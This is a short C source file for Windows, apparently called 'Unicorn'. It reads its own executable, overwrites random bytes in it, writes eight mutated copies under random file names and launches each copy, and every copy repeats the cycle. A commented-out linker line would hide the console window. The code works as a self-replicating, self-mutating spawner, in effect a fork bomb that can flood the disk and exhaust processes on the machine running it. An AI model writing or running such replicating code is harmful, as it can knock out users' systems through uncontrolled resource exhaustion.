#define _CRT_SECURE_NO_WARNINGS
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include <stdio.h>
#include <Windows.h>
#include <sys\timeb.h>
#include "Unicorn.h"

#define NextNum 8
#define GapTime 4096

int myEXESize = 0;
UINT8* myFileBuffer = 0;

char nextEXEName[256] = { 0 };
char **global_argv = 0;

void PopCtl(void);

int main(int argc, char** argv)
{
    global_argv = argv;
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp); fp = NULL;

    for (int i = 0; i < NextNum; i++)
    {
        for(int j=0; j<x86MaxInsLen; j++)
            myFileBuffer[Get_Hardware_Rand() % myEXESize] = Get_Hardware_Rand() & 0xFF;
        
        while (fp == NULL)
        {
            sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
            fp = fopen(nextEXEName, "wb");
        }
        fwrite(myFileBuffer, 1, myEXESize, fp);
        Sleep(GapTime); // Delay is important here to avoid producing so fast
        fclose(fp); fp = NULL; // unlock the file
        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
    }
}